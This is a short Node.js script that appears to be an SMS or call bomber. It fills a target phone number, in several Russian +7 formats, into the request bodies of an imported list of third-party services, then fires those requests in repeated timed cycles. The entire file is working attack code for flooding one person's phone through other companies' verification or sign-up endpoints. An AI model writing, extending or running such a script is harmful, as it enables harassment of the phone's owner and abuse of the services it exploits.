import fetch from 'node-fetch';
import { services } from "./services.js";
const sleep = m => new Promise(r => setTimeout(r, m))
const numberTypes = {
    "NUM1": '7**********', "NUM2": "**********",
    "NUM3": "+7 (***) ***-**-**", "NUM4": "+7 *** ***-**-**",
    "NUM5": "+7**********"
}
const num = '9991234455', repeats = 2
function maskNum(mask, num) {
    const splittedNum = num.split``
    let res = numberTypes[mask];
    console.log(res)
    for (const el of splittedNum) {
        res = res.replace("*", el)
    }
    return res
}
for (let j = 0; j < repeats; j++) {
    for (let i = 0; i < services.length; i++) {
        try {
            if (j === 0) {
                const needNumber = services[i].cfg.body.match(/NUM\d/gi)
                const cfg = services[i].cfg.body.replace(/NUM\d/gi, maskNum(needNumber, num))
                services[i].cfg.body = cfg
            }
            const req = fetch(services[i].url, services[i].cfg)
            console.log(services[i].url.split(/\//gi)[2], 'was sended successfully')
        } catch (e) {
            console.log(services[i].url.split(/\//gi)[2], `something went wrong`, e)
        }
        await sleep(100)
    }
    if (j === repeats - 1) {
        console.log('Script completed successfully')
    } else {
        console.log(`${j + 1}th cycle was completed successfully! Next cycle will be launched in 30 seconds`)
    }
    await sleep(30000)
}